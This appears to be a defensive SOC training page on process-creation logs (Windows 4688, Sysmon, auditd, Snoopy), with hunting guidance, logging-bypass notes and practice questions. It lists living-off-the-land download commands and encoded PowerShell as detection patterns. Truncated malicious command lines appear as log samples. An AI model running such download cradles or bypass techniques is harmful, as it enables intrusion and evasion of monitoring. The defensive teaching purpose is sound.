| | Windows 4688 | Sysmon Event 1 | auditd `execve` | Snoopy |
| --- | --- | --- | --- | --- |
| Where | Security channel | Sysmon/Operational channel | `/var/log/audit/audit.log` | syslog → `auth.log`/`secure` |
| Command line | With extra policy | Yes | Yes (EXECVE/PROCTITLE, sometimes hex) | Yes, one line |
| Parent | Name + PID | Path, PID, GUID, command line | `ppid` only | No (only session context) |
| Real logged-in user | `SubjectLogonId` → 4624 | `LogonId` | `auid` | `login:` |
| Hashes | No | Yes | No | No |
| Format | One event | One event | Several lines per event | One line |
| Bypass | Clearing logs, policy change | Driver unload, config tampering | Rule deletion, stopping auditd | Static binaries, preload removal |

## Putting it to work in a SOC { #soc-use }

- **Turn it on and prove it.** Windows: *Audit Process Creation* = Success **and** the command-line policy, on every system; check a sample host's 4688 has a non-empty `CommandLine`. Linux: `execve` rules for both `b64` and `b32` (or Snoopy/EDR), confirmed with `auditctl -l` and a test command.
- **Normalise** to common fields: `host`, `user`, `process_path`, `process_name`, `command_line`, `process_id`, `parent_path`, `parent_command_line`, `parent_id`, `hash_sha256`, `logon_id`/`auid`. Decode auditd hex at ingest.
- **Hunt and alert on:** Office, PDF readers, browsers or web servers spawning shells or script hosts; encoded or hidden PowerShell (`-enc`, `-w hidden`); signed binaries with download or proxy-execution arguments (`certutil -urlcache`, `mshta http`, `rundll32` with odd paths, `regsvr32 /i:http`); executables running from `Temp`, `Downloads`, `Public`, `ProgramData` or `/tmp`, `/dev/shm`; renamed system tools (`OriginalFileName` ≠ file name); `vssadmin`/`wbadmin`/`bcdedit` recovery tampering; discovery bursts (`whoami`, `net group`, `nltest`, `id`, `uname -a`, `find / -perm -4000`) in a short window; `auid` unset with `tty=(none)` running interactive tools; first-seen and rare hashes across the fleet.
- **Chain backwards and forwards.** From a suspicious process, follow the parent chain to the root cause (email attachment, web request, login) and the children to see what happened next; join with network and file events by `ProcessGuid` or PID + host + time.
- **Manage volume, not visibility.** Process logs are large. Filter known-good, high-volume automation carefully at the query or with narrow, reviewed exclusions; never drop whole programs such as `powershell.exe` or `bash` from collection.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid as is"
    Process creation remains one of the highest-value logs in any SOC, and the fields that matter — path, command line, parent, user, hash — are the same. Event 4688 and its fields, the separate command-line policy, Sysmon Event 1, the auditd `execve` rule and `audit.log` record format, `auid`, `ausearch`/`aureport`, and Snoopy's one-line format all work as described. "Parent → child → command line" is still how analysts read EDR process trees today.

!!! info "[Changed] What has changed"
    - **Sysmon is becoming part of Windows.** Microsoft announced in late 2025 that Sysmon functionality would be built into Windows, and in 2026 it rolled out to Windows 11 as an **optional feature that is off by default**: you add it in *Optional features*, then enable it with a configuration much like the standalone tool; events still go to `Microsoft-Windows-Sysmon/Operational`. Windows Server support was announced alongside. Check exact build requirements for your fleet, and do not run the standalone Sysmon and the built-in one at the same time.
    - **EDR is now the main process source** in most organisations. Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne, Elastic Defend and similar products record process trees with hashes and signers by default, and many SIEMs ingest that telemetry directly. 4688/Sysmon remain valuable as an independent second source and where there is no EDR.
    - **eBPF-based Linux sensors** (Sysmon for Linux, Falco, Tetragon, most Linux EDRs) are replacing hand-tuned auditd on many servers and containers: structured single-event output, lower overhead, and container awareness that auditd lacks.
    - **Common schemas** (Elastic Common Schema, OCSF, Microsoft's ASIM) now define standard process fields, so detection rules written once (for example Sigma rules) can run against 4688, Sysmon, EDR and Linux data alike.
    - **Attackers use AI** to vary command lines and obfuscation quickly; exact-string detections age faster, which makes parent-child and behaviour-based logic more important.

!!! warning "[Caution] Wrong or risky if done the old way"
    - **Don't assume 4688 has a command line.** Without the separate policy it is empty, and many environments still have it off.
    - **Don't read `ProcessId` in 4688 as the new process.** It is the parent; the new process is `NewProcessId`.
    - **Don't expect a signature in Sysmon Event 1**, and don't trust `Company`/`Description` as proof — they are written by whoever built the file.
    - **Don't collect only `arch=b64` execve on Linux** — add `b32` (and consider `execveat`).
    - **Don't search raw `audit.log` for words without decoding hex**; you will miss exactly the commands with spaces and quotes that attackers type.
    - **Don't treat Snoopy as tamper-proof**; pair it with off-host forwarding and FIM on `/etc/ld.so.preload`.
    - **Don't "fix" volume by excluding PowerShell, cmd or bash** — those are what attackers use most.

## Practice questions { #quiz }

### Question 1

On a workstation you find a 4688 with `NewProcessName` = `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `CommandLine` = `powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...`, `ParentProcessName` = `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`, `TokenElevationType` = `%%1938`, `ProcessId` = `0x2210`. What does each field tell you, what is your hypothesis, and what do you look at next?

??? success "Answer and explanation"
    - `NewProcessName` — the genuine Windows PowerShell in its normal path; the program itself is legitimate.
    - `CommandLine` — `-nop` (no profile), `-w hidden` (hidden window) and `-enc` (Base64-encoded command, UTF-16LE) together are a classic way to run a script without the user seeing it. The visible start of the Base64 decodes to text beginning `IEX (New-Obj...` — "download and run in memory" (T1059.001).
    - `ParentProcessName` — **Excel started PowerShell.** Spreadsheets do not normally do this; it points to a malicious document with macros or an embedded exploit (T1204.002, often after T1566.001 phishing).
    - `TokenElevationType` `%%1938` — a limited (non-elevated) token: the attacker runs as the user, not as admin, for now.
    - `ProcessId` `0x2210` — the **parent's** PID (Excel), useful to find other children Excel started.

    **Hypothesis:** a user opened a malicious spreadsheet that ran a hidden, encoded PowerShell download cradle. **Next:** decode the full Base64 (see [Base64](../http-analysis/base64.md)); find child processes of this PowerShell (4688s whose `ProcessId` equals this event's `NewProcessId`) and its network connections (Sysmon 3, firewall, proxy, DNS); PowerShell script block logs (4104) for the decoded script; the email that delivered the file; then contain the host and check other recipients of the same email.

### Question 2

On a Linux web server you find this auditd event. Explain the key fields and say what probably happened.

```text
type=SYSCALL msg=audit(1795142011.552:10442): arch=c000003e syscall=59 success=yes exit=0 ... ppid=2211 pid=31877 auid=4294967295 uid=33 gid=33 euid=33 ... tty=(none) ses=4294967295 comm="sh" exe="/usr/bin/dash" key="proc_create"
type=EXECVE msg=audit(1795142011.552:10442): argc=3 a0="sh" a1="-c" a2=6375726C202D73206874...
type=CWD msg=audit(1795142011.552:10442): cwd="/var/www/html/uploads"
```

??? success "Answer and explanation"
    - `msg=audit(...:10442)` — all three lines are one event (same time and serial).
    - `syscall=59 success=yes` — a successful `execve`: a program was started.
    - `auid=4294967295` and `ses=4294967295` — **no logged-in human** behind it; `tty=(none)` — no terminal. `uid=33`/`euid=33` — running as the web server account (`www-data` on Debian/Ubuntu).
    - `ppid=2211` — the parent; look it up, and you will likely find the web server or PHP worker process.
    - `comm="sh" exe="/usr/bin/dash"` — a shell (`sh` is a link to `dash` on Debian/Ubuntu).
    - `a2=6375726C...` — unquoted, so **hex**. `63 75 72 6C 20 2D 73 20 68 74` decodes to `curl -s ht...` — a download.
    - `cwd="/var/www/html/uploads"` — the shell was started in the web upload folder.

    **What happened:** a file uploaded to the web application (likely a webshell, T1505.003) made the web server run a shell that downloads something with `curl` (T1105). **Next:** decode the full `a2`, find the uploaded script in `/var/www/html/uploads` and the web access log request at that second, check for further `execve` events with `ppid=31877` or `auid` unset and `uid=33`, and look for outbound connections to the decoded URL.

### Question 3

A colleague says: "We installed Snoopy on all Linux servers, so we can turn off auditd — Snoopy logs every command and is much easier to read." Is this correct? Give two technical reasons and what you would recommend.

??? success "Answer and explanation"
    Not quite. Snoopy is a good, readable *additional* source, but it should not be the only one on important servers:

    - **It can be bypassed.** Snoopy is injected by the dynamic loader through `/etc/ld.so.preload`. Statically linked binaries never load it, so commands they start are not logged, and a root attacker can remove the preload entry or the library.
    - **It records less.** Snoopy logs commands. auditd can also watch file access (for example reads of `/etc/shadow`), account and permission changes, failed executions, and records `auid`, `ppid` and paths in a structured form. Snoopy does not record the parent process at all.
    - **Logs are in syslog**, which a local root attacker can also stop or alter if they are not forwarded quickly.

    **Recommendation:** keep Snoopy if it helps analysts (its lines are easy to alert on), but keep auditd (with `b64` and `b32` `execve` rules plus file watches on sensitive files, `/etc/ld.so.preload` and `/etc/audit/`) or an EDR/eBPF sensor on servers that matter; forward everything off the host; and alert when auditd is stopped or its rules are deleted. Not perfect does not mean not useful — but layers beat a single source.

## Related { #related }

- [Important Events](index.md) — this section's overview
- [Login events](logins.md) — the logon that a process's Logon ID / `auid` points back to
- [Windows event structure and channels](../windows-logging/event-structure-channels.md) — reading event XML and the Sysmon channel
- [Linux log files and the systemd journal](../linux-logging/log-files-journal.md) — where `auth.log` and `audit.log` live
- [Execution, persistence and discovery](../endpoint-attacks/execution-persistence-discovery.md) — the attacker actions these logs record
- [Application control, FIM and catching persistence](../endpoint-defense/appcontrol-fim-persistence.md) — the preventive side of "what is allowed to run"
- [PAWs, EDR, DLP and UEBA](../endpoint-defense/paw-edr-dlp-ueba.md) — EDR process telemetry
- [Windows Event IDs](../../../basics/windows-event-ids.md)
- [Prefetch](../../../windows/prefetch.md) — evidence of execution when no process log exists
- [Linux logs and triage](../../../linux/logs-and-triage.md)
